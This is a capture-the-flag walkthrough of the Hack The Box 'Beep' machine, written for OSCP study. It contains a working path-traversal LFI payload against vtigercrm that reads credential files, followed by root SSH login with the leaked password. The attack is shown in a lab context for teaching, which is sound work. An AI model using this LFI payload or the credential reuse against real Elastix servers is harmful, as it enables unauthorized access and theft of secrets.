# HTB — Beep

> **Difficulty:** Easy  
> **OSCP Prep Focus:** Web exploitation, LFI → credential reuse → direct root SSH  
> **Status:** Rooted ✅  

---

## 1. Overview

Beep is a legacy **Elastix/FreePBX** VoIP appliance running on CentOS.  
The attack path revolves around:

1. Enumerating a noisy attack surface with many open ports.
2. Finding a **Local File Inclusion (LFI)** in the `vtigercrm` component.
3. Using the LFI to read `/etc/amportal.conf` and extract **AMP credentials**.
4. Reusing the AMP password to **SSH directly as root**, bypassing traditional privilege escalation.
5. Handling **legacy SSH key-exchange algorithms** to connect from a modern Kali box.

This box is excellent for practicing **web exploitation + credential reuse + legacy protocol weakness exploitation**.

---

## 2. Target Information

| Item              | Value                      |
|-------------------|----------------------------|
| Hostname          | `beep`                     |
| IP Address        | `10.10.10.7`               |
| Operating System  | CentOS (Elastix appliance) |
| Notable Services  | 22 (SSH), 80/443 (Apache + Elastix/FreePBX), 10000 (Webmin), VOIP/Mail stack |

---

## 3. Enumeration

### 3.1 Nmap

```bash
# Full port scan
nmap -p- --min-rate 1000 -T4 -oA beep-allports 10.10.10.7

# Service detection
nmap -sC -sV -p22,80,443,10000 -oA beep-services 10.10.10.7
```

Observations:

- Very old **Apache 2.2.3**
- Multiple Elastix/FreePBX components
- Many mail/VOIP services but unnecessary for foothold
- Web stack looks most promising

### 3.2 Web Enumeration

```bash
gobuster dir \
  -u https://10.10.10.7/ \
  -k \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 \
  -o gobuster-root.txt
```

Key directories:

- `/vtigercrm/`
- `/recordings/`

---

## 4. Vulnerability Identification — LFI in vtigercrm

A known **Local File Inclusion (LFI)** exists in:

```
/vtigercrm/graph.php
```

### LFI Exploit

```bash
curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action="
```

The `%00` terminates processing for older PHP versions.

Output reveals:

```ini
AMPDBUSER=
AMPDBPASS=<leaked_password>
AMPMGRUSER=
AMPMGRPASS=
```

> **Critical Finding:** `AMPDBPASS` is reused as the **root SSH password**.

---

## 5. Exploitation — SSH as Root

### Initial Failure

```bash
ssh root@10.10.10.7
```

Error:

```
Unable to negotiate... no matching key exchange method found.
Their offer: diffie-hellman-group1-sha1
```

### Success Using Legacy Algorithms

```bash
ssh \
  -oKexAlgorithms=+diffie-hellman-group1-sha1 \
  -oHostKeyAlgorithms=+ssh-rsa \
  root@10.10.10.7
```

Enter the leaked AMPDBPASS.

Result:

```
[root@beep ~]# whoami
root
```

> On Beep, **foothold = privilege escalation** due to password reuse.

---

## 6. Post-Exploitation

### Flags

```bash
# User flag
cat /home/fanis/user.txt

# Root flag
cat /root/root.txt
```

### Additional Enumeration

```bash
uname -a
cat /etc/issue
ss -tulpn
ps aux
history
```

---

## 7. Lessons Learned / OSCP Takeaways

- LFI often leads to sensitive config disclosure.
- Credential reuse is a critical security failure.
- Legacy appliances may require forcing old cryptographic KEX and ciphers.
- Web exploitation is the shortest path—ignore noisy VOIP/Mail services.
- This machine is excellent for practicing OSCP methodology.

---

## 8. Useful Commands (Quick Reference)

```bash
# LFI to retrieve Elastix config file
curl -k "https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action="

# SSH with legacy algorithms enabled
ssh \
  -oKexAlgorithms=+diffie-hellman-group1-sha1 \
  -oHostKeyAlgorithms=+ssh-rsa \
  root@10.10.10.7
```

---

## 9. Recommended Screenshots for GitHub

Suggested screenshot files (place inside `/screenshots/`):

- `nmap.png` — Port/service enumeration  
- `web-root.png` — Elastix/FreePBX landing page  
- `gobuster.png` — Discovered directories  
- `lfi-amportal.png` — Output of `/etc/amportal.conf`  
- `ssh-error.png` — Legacy KEX negotiation failure  
- `ssh-root.png` — Successful SSH as root  
- `flags.png` — user.txt & root.txt dumps  

Embed example:

```markdown
![LFI exposing amportal.conf](screenshots/lfi-amportal.png)
```

---

> _Beep is a perfect OSCP-style machine that demonstrates how a single misconfiguration—LFI + credential reuse—can compromise an entire server._
